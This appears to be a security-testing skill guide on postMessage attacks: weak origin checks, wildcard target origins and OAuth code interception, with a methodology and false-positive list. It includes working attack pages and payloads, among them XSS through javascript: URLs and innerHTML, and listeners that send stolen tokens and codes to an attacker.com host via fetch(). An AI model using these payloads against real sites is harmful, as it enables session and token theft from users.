---
name: postmessage-attacks
description: PostMessage security testing — origin validation bypass, data injection, and cross-frame communication attacks
---

# PostMessage Attacks

`window.postMessage` enables cross-origin communication between frames, windows, and workers. Improper origin validation or insecure message handlers allow attackers to inject messages, steal data from cross-origin frames, or trigger actions on behalf of the victim.

## Attack Surface

**Common Uses**
- OAuth popup callbacks (`code`, `token` returned via postMessage)
- Payment provider iframes (Stripe, PayPal, Adyen)
- SSO login flows
- Chat widget integration
- Cross-origin advertising iframes
- Analytics/telemetry cross-frame communication
- Browser extensions communicating with page

**Vulnerable Patterns**
```javascript
// No origin check (Critical):
window.addEventListener('message', function(e) {
    document.location = e.data.url;  // Open redirect
    eval(e.data.code);               // XSS
    fetch(e.data.endpoint, {method:'POST', body: e.data.payload});
});

// Weak origin check:
window.addEventListener('message', function(e) {
    if (e.origin.includes('legit.com')) {  // Bypass: legit.com.attacker.com
        executeCommand(e.data);
    }
});

// Wildcard target origin (data leakage):
iframe.contentWindow.postMessage(sensitiveData, '*');
```

## Key Vulnerabilities

### Missing Origin Validation

```javascript
// Vulnerable handler — no origin check:
window.addEventListener('message', event => {
    if (event.data.type === 'navigate') {
        window.location.href = event.data.url;
    }
    if (event.data.type === 'exec') {
        eval(event.data.code);
    }
});

// Attack from attacker.com:
<script>
  var victim = window.open('https://target.com');
  setTimeout(() => {
    victim.postMessage({type: 'navigate', url: 'javascript:alert(1)'}, '*');
  }, 2000);
</script>
```

### Weak Origin Validation Bypasses

```javascript
// Target checks: e.origin === 'https://legit.com'
// But check is:
if (e.origin.indexOf('legit.com') !== -1)   // Bypass: https://legit.com.evil.com
if (e.origin.includes('legit.com'))          // Bypass: https://legit.com.evil.com
if (e.origin.match(/legit\.com/))            // Bypass: https://evillegit.com

// Register: legit.com.attacker.com → sends postMessage → origin check passes
```

### Wildcard Target Origin

```javascript
// Sender uses * — sends sensitive data to any origin:
window.parent.postMessage({token: secretToken, user: userData}, '*');

// Attacker frames the target page:
<iframe src="https://target.com/oauth/callback"></iframe>
// Listens for the message with wildcard origin
<script>
window.addEventListener('message', function(e) {
    fetch('https://attacker.com/?token=' + JSON.stringify(e.data));
});
</script>
```

### OAuth Code/Token via PostMessage

```javascript
// Many OAuth flows return code/token via postMessage to opener:
// opener.postMessage({code: authCode, state: state}, '*');
// Or with broad origin: 'https://app.com'

// Attack:
// 1. Open victim's OAuth flow as popup from attacker page
// 2. Listen for postMessage response
// 3. Intercept authorization code/token
<script>
window.addEventListener('message', function(e) {
    if (e.data.code) {
        // Exchange code for access token (CSRF bypass via postMessage)
        fetch('/https://attacker.com/?stolen_code=' + e.data.code);
    }
});
window.open('https://target.com/oauth/authorize?client_id=X&redirect_uri=https://target.com/callback');
</script>
```

### Message Injection via Subframe

```javascript
// If target page embeds an iframe from attacker-controlled subdomain:
// xss.target.com (via subdomain takeover) can postMessage to parent
// Parent trusts messages from *.target.com origin

// Attack:
// 1. Take over subdomain: xss.target.com
// 2. Host page that postMessages malicious data to parent
// 3. Parent processes message (origin matches *.target.com)
```

### JSON Data Injection

```javascript
// Vulnerable handler processes JSON from postMessage:
window.addEventListener('message', function(e) {
    var data = JSON.parse(e.data);
    document.getElementById(data.elementId).innerHTML = data.content;
});

// Attack:
postMessage('{"elementId":"output","content":"<img src=x onerror=alert(1)>"}', '*');
```

## Finding PostMessage Handlers

```javascript
// Static analysis in JS:
grep -r "addEventListener.*message" *.js
grep -r "postMessage" *.js

// Dynamic instrumentation in browser console:
// Override addEventListener to log all message handlers:
var origAddEventListener = window.addEventListener;
window.addEventListener = function(type, handler, ...args) {
    if (type === 'message') {
        console.log('PostMessage handler registered:', handler.toString());
    }
    return origAddEventListener.call(this, type, handler, ...args);
};

// Burp DOM Invader:
// Enables automatic postMessage probing and canary injection
```

## Testing Methodology

1. **Find message handlers** — Grep JS source for `addEventListener('message'` and `onmessage`
2. **Check origin validation** — Does handler verify `e.origin`? How?
3. **Test origin bypass** — Register lookalike domain if check is weak
4. **Test no-origin case** — Send postMessage from attacker origin, observe behavior
5. **Test data injection** — Send XSS payloads, URLs, commands in message data
6. **Find wildcard senders** — Look for `postMessage(data, '*')` sending sensitive data
7. **Test OAuth flows** — Does code/token return via postMessage? Can it be intercepted?
8. **Test iframe scenarios** — Can target be framed, and does it leak data?

## Attack Template

```html
<!-- attacker.com/attack.html -->
<!DOCTYPE html>
<html>
<body>
<script>
// Step 1: Open target in popup/iframe
var target = window.open('https://target.com/page-with-handler');

// Step 2: Listen for responses
window.addEventListener('message', function(e) {
    console.log('Received:', e.origin, e.data);
    fetch('https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify({
        origin: e.origin,
        data: e.data
    })));
});

// Step 3: After target loads, send malicious message
setTimeout(function() {
    target.postMessage({type: 'action', url: 'javascript:alert(document.cookie)'}, '*');
    // Or:
    target.postMessage({command: 'navigate', href: 'http://attacker.com'}, '*');
}, 3000);
</script>
</body>
</html>
```

## Validation

1. Demonstrate that a message from attacker origin is processed by the target handler
2. Show XSS execution, data theft, or action taken based on attacker-controlled postMessage
3. For wildcard sender: show the sensitive data received by attacker-controlled listener
4. Provide the specific handler code and bypass demonstration

## False Positives

- Strict origin validation: `e.origin === 'https://exact-domain.com'`
- Handler only processes non-sensitive public data
- No useful actions in handler (logging only)
- CSP blocks execution of injected code

## Impact

- XSS via eval or innerHTML in postMessage handler
- Open redirect via URL in postMessage
- OAuth token/code theft via wildcard origin
- CSRF-like action execution without traditional CSRF token
- Data exfiltration from cross-origin frames

## Pro Tips

1. DOM Invader in Burp automatically tests postMessage handlers with probe messages
2. Look for popup-based OAuth flows — they almost always use postMessage
3. Wildcard target origin `postMessage(data, '*')` is automatic finding if data is sensitive
4. Subdomain takeover + postMessage = trusted origin injection
5. `e.source` is the sending window — check if handler verifies both origin AND source
6. `window.onmessage` is equivalent to `addEventListener('message')` — check both
7. Service workers also use message events — test those too

## Summary

PostMessage attacks exploit missing or weak origin validation in cross-frame communication. Find handlers in JavaScript source, verify origin validation strength, and craft messages from attacker origins or lookalike domains. OAuth code theft via postMessage with wildcard target origin is the highest-impact variant.
